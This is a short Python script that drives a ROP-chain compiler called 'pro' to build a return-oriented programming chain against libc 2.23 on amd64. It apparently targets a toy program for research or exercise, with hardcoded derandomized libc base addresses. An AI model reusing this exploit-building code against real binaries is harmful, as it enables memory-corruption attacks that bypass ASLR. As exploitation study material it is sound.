import sys
import pro

class MyCodeGen(pro.CodeGenAmd64):
    def store_reg_mem(self, reg, addr):
        if reg == 'rax':
            store_rdx_rax = self.prog.env['store_rdx_rax']
            r = self.set_reg_imm('rdx', addr)
            r.append(store_rdx_rax)
            r.define |= {'rdx'}
            return r
        raise NotImplemented('store_reg_mem %s' % reg)

if __name__ == '__main__':
    rendered = pro.process_file('toy.pro', path=['../common'],  LIBC_VERSION='2.23')

    prog = pro.parse(rendered)

    gen = MyCodeGen(prog)
    libc_base = 0x00002aaaaacd3000 # 16.04
    # libc_base = 0x00002aaaaacd1000 # 15.10
    reloc = {'libc':libc_base, '_CODE':0x602010} # derandomized
    chain = gen.gen_chain(reloc)

    sys.stdout.write(chain)
